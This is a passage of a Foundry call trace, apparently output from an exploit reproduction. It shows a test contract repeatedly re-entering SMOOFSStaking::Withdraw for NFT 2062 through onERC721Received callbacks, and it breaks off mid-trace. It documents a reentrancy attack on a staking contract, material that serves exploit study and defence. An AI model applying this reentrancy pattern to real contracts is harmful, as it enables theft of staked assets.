+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2854 → 2855
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 0 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11741710] SMOOFSStaking::Withdraw(2062, true)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11741317] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9881223] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9833493] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 0 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2854 → 2855
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9777376] SMOOFSStaking::Withdraw(2062, true)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9776983] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7916889] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7869159] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2854 → 2855
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 0 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7813042] SMOOFSStaking::Withdraw(2062, true)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7812649] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5952555] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5904825] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 0 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2854 → 2855
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5848708] SMOOFSStaking::Withdraw(2062, true)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5848315] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3988221] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3940491] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 0 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2854 → 2855
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3884374] SMOOFSStaking::Withdraw(2062, true)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3883981] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2019087] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1971357] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 0 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2854 → 2855
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1915240] SMOOFSStaking::Withdraw(2062, true)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1914847] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [49181] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1451] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 1
